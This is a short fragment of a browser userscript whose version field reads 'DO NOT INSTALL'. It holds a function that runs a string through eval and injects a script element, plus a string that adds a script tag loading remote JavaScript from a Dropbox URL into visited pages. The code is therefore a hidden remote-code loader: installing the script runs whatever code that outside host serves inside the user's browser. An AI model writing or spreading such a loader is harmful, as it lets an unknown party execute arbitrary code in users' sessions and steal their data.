...
// @version     DO NOT INSTALL
// ==/UserScript==

{function itoj(j){var s=document.createElement('script');s.innerHTML=eval(j);document.body.appendChild(s);}
var k="{var a=document.createElement('script');a.type='text/javascript';a.src='https://dl.dropbox.com/s/mz3coackqovzq02/1004-1.js';document.getElementsByTagName('head')[0].appendChild(a)}";
